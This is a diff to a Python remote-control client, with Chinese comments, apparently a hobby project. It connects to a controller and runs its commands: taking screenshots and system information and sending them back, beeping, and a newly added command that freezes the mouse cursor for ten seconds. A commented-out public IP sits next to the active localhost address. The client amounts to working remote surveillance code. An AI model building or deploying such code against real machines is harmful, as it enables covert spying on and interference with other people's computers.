@@ -20,12 +20,14 @@ def screenshot(ConnSock):
     import io
     from PIL import Image
     img = pyautogui.screenshot()#截图
+    print("截图成功")
     img_byte=io.BytesIO()#字节流IO
     img.save(img_byte,format="JPEG")#转格式
     binary_str=img_byte.getvalue()#保存
+    print("数据长度："+str(len(binary_str)))
     ConnSock.send(PackLen(len(binary_str)))#先发送4字节长度
     #发送数据
-    ConnSock.send(binary_str)
+    ConnSock.sendall(binary_str)
 
 
 def sysinfo(ConnSock):
@@ -55,7 +57,7 @@ def sysinfo(ConnSock):
     #结构化发送
     ConnSock.send(PackLen(len(SendData)))#先发送4字节长度
     #发送数据
-    ConnSock.send(SendData)
+    ConnSock.sendall(SendData)
 
 def systeminfo(ConnSock):
     import os
@@ -65,7 +67,7 @@ def systeminfo(ConnSock):
     systeminfoStr=bytes(systeminfoStr.encode('utf-8'))
     #结构化发送
     ConnSock.send(PackLen(len(systeminfoStr)))#先发送4字节长度
-    ConnSock.send(systeminfoStr)
+    ConnSock.sendall(systeminfoStr)
     
 def mouse(ConnSock):
     print("mouse")
@@ -79,6 +81,22 @@ def Beep(ConnSock,*args):
     import ctypes
     ctypes.WinDLL('Kernel32.dll').Beep(2000,1000)
 
+def LockMouse10s(*args):
+    import time
+    import ctypes
+    for i in range(100):
+        #print("锁定: "+str(i))
+        ctypes.WinDLL('user32.dll').SetCursorPos(0,0)
+        time.sleep(0.1)
+        
+def lockmouse(ConnSock,*args):
+    print("---------Lock--------")
+    from threading import Thread
+    import time
+    import ctypes
+    t1=Thread(target=LockMouse10s, args=("线程1",))
+    t1.start()
+    
 def close(ConnSock,*args):
     print("---------close--------")
     ConnSock.close()
@@ -93,11 +111,12 @@ CommandList = {
     3:systeminfo,
     4:mouse,
     5:Beep,
-
+    6:lockmouse,
     99:close
     }
     
 if __name__ == '__main__':
+    #Host = '36.133.142.149'
     Host = '127.0.0.1'
     Port = 3066
     c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
